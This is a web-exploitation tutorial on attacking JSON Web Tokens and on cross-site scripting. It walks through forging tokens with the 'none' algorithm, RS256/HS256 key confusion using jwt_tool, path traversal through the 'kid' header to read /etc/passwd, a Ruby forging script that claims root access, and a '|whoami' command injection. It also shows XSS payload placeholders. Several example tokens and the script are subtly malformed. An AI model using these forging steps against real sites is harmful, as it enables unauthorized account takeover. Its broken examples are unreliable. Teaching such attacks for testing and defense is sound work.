# Learning from the Field: Web Exploitation

## JWT

JSON Web Token (JWT) is an Internet standard for creating data with optional signature and optional encryption. JWTs can be signed using a secret (with the HMAC algorithm) or a **public/private** key pair using **RSA** or **ECDSA**.

### Usage of JWTs

A very common use of a JWT token is as an API **authentication mechanism**. as well as **Information Exchange**.

#### Authorization

Once the user is logged in, the user can access everything allowed with that token.

#### Information Exchange

JWTs are useful in sharing information because they are signed by public/private keys as well as we can verify the token if it's tampered or not.

### JSON Web Token structure

JWTs cosists of 3 parts seperated by dots.

header.payload.signature

#### Header

Header consist of 2 things first one is **type of token** and another thing is **signing algorithm** like HMAC SHA256 or RSA.

For Example:

`Base64:    eyJhbGciOiAiU0gyNTYiLAogICJ0eXAiOiAiSldUIn0=`

After Decoding:

``` 
{
  "alg": "SH256",
  "typ": "JWT"
} 
```

#### Payload

Payload contains the claims. Claims are statements about the user and additional data about the user.

For Example:

`Base64: eyJpZCI6ICIxIiwKICAibmFtZSI6ICJBbmFzIEphbWFsIiwKICAiYWRtaW4iOiB0cnVlfQ==`

After Decoding:
```

{
    "id": "1",
  "name": "Anas Jamal",
  "admin": true
} 

```

#### Signature

For creating the signature part you have to take the base64 encoded header and payload, a secret, the algorithm specified in the header, and sign that.

For Example:

```

HMACSHA256(
  base64UrlEncode(header) + "." +
  base64UrlEncode(payload),
  secret
  )
  ```

#### All 3 Combined

`Header + Payload + Secret`


```
eyJhbGciOiAiU0gyNTYiLAogICJ0eXAiOiAiSldUIn0.eyJpZCI6ICIxIiwKICAibmFtZSI6ICJBbmFzIEphbWFsIiwKICAiYWRtaW4iOiB0cnVlfQ.6pqwrq5XQFq3453rtw234fuZ4
```

### Awesome, Now let's learn How To Hack Them

Whenever you will recieve a jwt token first decode it and break it into parts like we have learnt in the above section.

`Header + Payload + Secret`

For decoding you can use:

1. Terminal  
2. [jwt.io](https://jwt.io/). 
3. Decoder tab in burp Suite

There are other ways for decoding the token too.

#### Terminal

Linux:

```
echo "eyJhbGciOiAiU0gyNTYiLAogICJ0eXAiOiAiSldUIn0" | base64 -d 
```

Mac OS:

```
echo "eyJhbGciOiAiU0gyNTYiLAogICJ0eXAiOiAiSldUIn0" | base64 -D 
```

Note: Keep in mind in mac os we use "D" instead of  "d".

#### jwt.io

just copy the whole token and paste it into `Encoded` Section and you will get decoded token in `Decoded` Section.

#### Burp Suite Decoder

Copy the whole token and go to burp suite `Decoder` tab and paste it there and select first part and click on `decode` as `base64` and do the same thing with other parts of the token.

**Note** : Don't include dot(`.`) while decoding the token.

#### None Algorithm

`None` Algorithm is used when the integrity of the token has been already verified but hackers can use this algorithm and can tamper the token and can gain unauthorized access. 
Let's See How

```
Token : eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoidGVzdCJ9.6pqwrq5XQFq3453rtw234fuZ4
```

#### JWT Token Break Down :

1. eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9 (Header)
2. eyJ1c2VyIjoidGVzdCJ9 (Payload)
3. 6pqwrq5XQFq3453rtw234fuZ4 (Secret)

After Decoding:

Header:
```
{
    "alg":"HS256",
    "typ":"JWT"
}
```

Payload:
```
{
    "user":"test"
}
```
Now let's change "alg" from `HS256` to `None` and "user" from `test` to `admin`

Header After Changes:

```
{
    "alg":"None",
    "typ":"JWT"
}
```

Payload After Changes:
```
{
    "user":"admin"
}
```

Now base64 encode `Header` and `Payload` and send the new token to the web application with empty `secret`.

New Token:

```
eyJhbGciOiJOb25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4ifQ.
```

For encoding we can use :

1. CyberChef

2. Burp Suite Decoder

3. Your Terminal

For encoding on Terminal just remove `-d` / `-D` let's see an example

```
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64
```

Very Simple right?

For sending Requests we can use:

1. Inspect Element > Go to cookies > replace the token with your new token.

2. Burp Suite Intercept or send the requests to repeater and play with the request.

So this is one simple way of hacking JWTs.

## CVE-2016-5431 Key Confusion Vulnerability

### RSA

The `RSA` is asymmetric and in assymetric we have 2 keys 

```
1. Public Keys (for verifying you need a public key coresponding to the private key used for the signature.)

2. Private Keys. (For signing the token you need a private key)
```

Library Function: `verify(clientToken, serverRSAPublicKey)`

### HMAC

The `HMAC` uses the same secret for signing as well as verifying the token.

Library Function: `verify(clientToken, serverHMACSecretKey)`

### The Vulnerability

The vulnerability is straight forward, The attacker can change the algorithm from `RS256` to `HS256` that means from RSA to HMAC .

So when you send the tampered cookie the code will call `verify(clientToken, serverHMACSecretKey)` instead of `verify(clientToken, serverRSAPublicKey)` because our token algorithm is `HS256`.

Now Public keys are available publicly and we can forge our new token by changing the algorithm from `RS256` to `HS256` and signing our token with the publicly available key.

### The Exploitation

We can exploit it in several ways we will mention 3 methods:

 
1. Manually decoding / encoding and signing.

2. Writing your own script using any scripting language (ruby/python).

3. using [jwt_tool](https://github.com/ticarpi/jwt_tool).

The easiest way is using [jwt_tool](https://github.com/ticarpi/jwt_tool) let's see how.

1. clone the tool and install all dependencies.

2. Download the public key in the same directory.

3. Run the tool

Syntax : `./jwt_tool.py <paste your token>`

```
$ ./jwt_tool.py eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJsb2dpbiI6ImFuYXMifQ.abcWIUU4HvocTw1aiP44hjawkr5CUTTjRAb0QCb00l82vJjjs5Nuilm10eQMkGGlleH_99MSMgZZ8xlZksOtVWmcXXflAOm0pLiDhol_Fpnak-BMSUmc9CjtJvFy_0qkmKz8T4QWZ7gG2XjRGcsueNKS-Hx9ExGDlLAGsdmiwMiLzuNeO7iW7ECG9nUrNMpArL3s9cMi-NBiSQQd3DkJLNPZzk2J0Ew-aM3Z744uBH38oNKl4n2ktr4baQMxMIe7pecNLzGgQnZ9UPt-kgzqzPActSK0H4CLhJAekNv3QgOhtJxfeF3e9bMkVx8E4rhTnX4gTqfeu1CX-r1VCtaLdQ
```

#### OUTPUT

after running choose option 1 for tampering with the token.

```
=====================
Decoded Token Values:
=====================

Token header values:
[+] typ = JWT
[+] alg = RS256

Token payload values:
[+] login = anas

----------------------
JWT common timestamps:
iat = IssuedAt
exp = Expires
nbf = NotBefore
----------------------


########################################################
#  Options:                                            #
#                ==== TAMPERING ====                   #
#  1: Tamper with JWT data (multiple signing options)  #
#                                                      #
#             ==== VULNERABILITIES ====                #
#  2: Check for the "none" algorithm vulnerability     #
#  3: Check for HS/RSA key confusion vulnerability     #
#  4: Check for JWKS key injection vulnerability       #
#                                                      #
#            ==== CRACKING/GUESSING ====               #
#  5: Check HS signature against a key (password)      #
#  6: Check HS signature against key file              #
#  7: Crack signature with supplied dictionary file    #
#                                                      #
#            ==== RSA KEY FUNCTIONS ====               #
#  8: Verify RSA signature against a Public Key        #
#                                                      #
#  0: Quit                                             #
########################################################

Please make a selection (1-6)
> 1

```

After choosing `1` choose `0` and press `1` and change `<your username>` to `admin` in this case from `anas` to `admin`.

```
====================================================================
This option allows you to tamper with the header, contents and 
signature of the JWT.
====================================================================

Token header values:
[1] typ = JWT
[2] alg = RS256
[3] *ADD A VALUE*
[4] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 0

Token payload values:
[1] login = anas
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step

Please select a field number:
(or 0 to Continue)
> 1

Current value of login is: demo
Please enter new value and hit ENTER
> admin
[1] login = admin
[2] *ADD A VALUE*
[3] *DELETE A VALUE*
[0] Continue to next step
```
press `0`

Now the last Step:
The vulnerability here is `Sign with HS/RSA key confusion vulnerability` choose `4` and type the name of public key file name in this case our public key file name is `public.key` and hit `Enter` and if everything goes well we will get our new forged token.
```
Token Signing:
[1] Sign token with known HMAC-SHA 'secret'
[2] Sign token with RSA/ECDSA Private Key
[3] Strip signature using the "none" algorithm
[4] Sign with HS/RSA key confusion vulnerability
[5] Sign token with key file
[6] Inject a key and self-sign the token (CVE-2018-0114)
[7] Self-sign the token and export an external JWKS
[8] Keep original signature

Please select an option from above (1-5):
> 4

Please enter the Public Key filename:
> public.key

====================================================================
This option takes an available Public Key (the SSL certificate from 
a webserver, for example?) and switches the RSA-signed 
(RS256/RS384/RS512) JWT that uses the Public Key as its 'secret'.
====================================================================
File loaded: public.key

Set this new token as the AUTH cookie, or session/local storage data (as appropriate for the web application).
(This will only be valid on unpatched implementations of JWT.)

eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJsb2dpbiI6ImFkbWluIn0.CN6XRx3X4MavzJW0pYNJWJzt0xdSLwnGRX6uHr35qGA

```

Now just send the forged cookie to the site using curl, burp suite, or simply using inspect element. 
Finally we will get admin access :)

## Vulnerabilities in KID

Let's see what is `KID` or `Key Identifier` :

`Kid` is an optional header claim which holds a key identifier, `kid` is useful when we have multiple keys to sign the token and we need to check the right key to verify the signature. 
You can try exploit them if they are not properly sanitized.

### Multiple types of vulnerabilities in kid: 

  1. Local File Inclusion.

  2. Sql Injection.

  3. Command Execution.

### Local File Inclusion

Let's Take an Example :

#### Token

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6IjEifQ.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
```

After Decoding `header` :

Note: You can decode base64 using methods mentioned above.

Header:
```
{
  "typ":"JWT",
  "alg":"HS256",
  "kid":"1"
}
```
Currently `kid` is `1` now let's replace `1` with `./../../../etc/passwd` and again encode it and send it to the site.

```
{
  "typ":"JWT",
  "alg":"HS256",
  "kid":"./../../../etc/passwd"
}
```
After Encoding Header:

`e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDouLy4uLy4uLy4uL2V0Yy9wYXNzd2R9Cg`

Full Token:

`e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDouLy4uLy4uLy4uL2V0Yy9wYXNzd2R9Cg.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y`

replace this with the old token and refresh and voila! we got LFI.

Now let's forge our token and become root user on the site.
For this we need to write simple script in python/ruby. 

#### Ruby Script

we need to understand first how to sign our token using ruby don't worry it is very simple. 

`OpenSSL::HMAC.hexdigest("SHA256", key, data)` 

we can import `openssl` and use the above line as it is.
for more info refer this => [openssl_hmac](https://ruby-doc.org/stdlib-2.4.0/libdoc/openssl/rdoc/OpenSSL/HMAC.html).

```
require 'base64'
require 'openssl'

header = '{"typ": "JWT","alg": "HS256","kid": "../../../../../../../../dev/null"}'

payload = '{"user": "root"}'

token = header+"."+payload
newtoken = Base64.strict_encode64(token).gsub("=","")

key = ""

sig = OpenSSL::HMAC.digest(OpenSSL::Digest.new("SHA256"), key, newtoken)

newsig = Base64.strict_encode64(sig).gsub("=", "")
puts newtoken+"."+newsig
```

In the above script we are requesting `/dev/null` which is empty/null file and passing empty value in `key` therefore, Both values are empty and at the time of verification the site will verify the token as a result you will get logged in as `root` user.

`gsub` is used for substituting `=` signs with `empty space`.

`Base64.strict_encode64` is used for encoding the `newtoken` as well as `newsig`. 

`Strict` means that white spaces / CR/LF are rejected at decode and CR/LF are not added at encode.

after creating the script run the script in the terminal

`$ ruby newtoken.rb`

#### Final Token

`eyJ0eXAiOiAiSldUIiwiYWxnIjogIkhTMjU2Iiwia2lkIjogIi4uLy4uLy4uLy4uLy4uLy4uLy4uLy4uL2Rldi9udWxsIn0ueyJ1c2VyIjogInJvb3QifQ.RlRo904TG62K3+FEOltbXfitiBnBUAxepCmUkuFAf1E`

Send the forged token to the site using burp repeater, curl or simply by using inspect element and refresh.

we will get logged in as `root`. 

### Command Injection 

Command Injection through `kid` is similar to LFI script. For Forging a root account token use the script used in LFI section. In this we will focus on `Command Injection` .

#### Token

`{typ:JWT,alg:HS256,kid:"1"}`

```
e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDoiMSJ9Cg.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
```

Decode it using methods mentioned above.

#### Edited Token


`{typ:JWT,alg:HS256,kid:"1"|whoami}`

Encode it:

`e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDoiMSJ8d2hvYW1pfQo`

#### Final Token

```
e3R5cDpKV1QsYWxnOkhTMjU2LGtpZDoiMSJ8d2hvYW1pfQo.eyJ1c2VyIjoiYW5hcyJ9.spzCikhspCdf6XAUci3R4EpJOH6gvZcvkDCVrkGbx7Y
```

Just send it to the site using burp repeater, curl or just edit the cookie using inspect element.

# XSS

Cross-Site Scripting (XSS) attacks are a type of injection.Using This You can inject malicious payload in to the website.

## Type Of XSS

### Reflected XSS
 
It occurs when an application receives data in an HTTP request and includes that data within the response

```html
   http://example.com/data?username=Data+Example

   <h2> Username : Data Example </h2>
````
It can not perform any other processing in data so that we can inject our payload easyly.

```html
   http://example.com/data?username=<script>/* Your Payload */ </script>

   <h2> Username : <script>  /* Your Payload */ </script>
```
**How impact Reflected XSS in our website**

* It Perform any action that user can perform in website.
* View and modify any information that user can do

###Stored XSS

Its occurs when an application receives data from an untrusted source and includes that data within its later HTTP responses

```html
  http://example.com/result?username=Data+Example&address=user+address&feedback=temp+feedback

  <p>temp feedback </p>
```

It can not perform any other processing in data so that we can inject our payload easyly.
here we use encoded url.


```html
  http://example.com/result?username=Data+Example&address=user+address&feedback=%3Cscript%3E%20%20%2F*%20Your%20Payload%20*%2F%20%3C%2Fscript%3E

  <p><script>  /* Your Payload */ </script></p>
```
When its execute in website now it is permanently added in that website and any user can view that

**How impact Stored XSS in our website**

* Attackers can change any parameters and write anything in the website source code
* Attackers can easyly execute that malicious code in website 
* The key difference between reflected and stored XSS is that stored XSS vulnerabilities are contained within the application and the attacker does not need to induce the target to click on a specific link with their exploit.

###DOM(Document Object Model) XSS

Its occurs when an application contains some client-side JavaScript that processes data from an untrusted source, usually by writing the data back to the DOM.

```html
var search = document.getElementById('username').value;
var results = document.getElementById('results');
results.innerHTML = 'Your username is : ' + username;

``` 

Hear attacker can control the value of input field so that they can create their own malicious payload and execute it

```html
 Your username is : <img src=1 onerror='/* Your Payload */'>
``` 

**What is the impact of XSS vulnerability in website ?**

*Account Hijacking : Attackers often steal session cookies in the browser to hijack user accounts.
*Credential Theft  : Attackers can clone the page and sent that page to victim and victim use credentials and its forward to attacker.
*Data Leakage : attacker has access to the personal or sensitive information of users
